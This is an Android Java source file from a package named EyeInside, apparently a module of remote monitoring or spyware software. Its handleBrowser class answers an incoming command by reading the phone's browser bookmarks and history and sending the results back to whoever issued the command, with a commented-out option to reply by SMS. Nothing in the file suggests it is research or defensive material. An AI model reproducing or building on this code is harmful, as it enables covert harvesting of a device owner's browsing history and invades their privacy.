package com.code4bones.EyeInside;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.provider.Browser;

import com.code4bones.utils.NetLog;

final class handleBrowser extends Handler {

	private Context mContext;
	
	public handleBrowser(Context context) {
		mContext = context;
	}
	
	public static final Uri URI = Browser.BOOKMARKS_URI;    

	public void handleMessage(Message msg) {
	   CommandObj cmd = (CommandObj) msg.obj;
	   Cursor cur = mContext.getContentResolver().query(URI, Browser.HISTORY_PROJECTION,null, null, "_id DESC");
       if  (cur == null || !cur.moveToFirst() ) {
       		NetLog.e("Browser Cursor null");
    	   return;
       }
 		try {
				cmd.Reply(cur);
				cur.close();
			} catch (Exception e) {
				NetLog.v("handleBrowser error: %s",e.getMessage());
				e.printStackTrace();
				//cmd.replySMS("E: %s -> %s", cmd.commandName,e.getMessage());
		}
	} // handleMessage
}
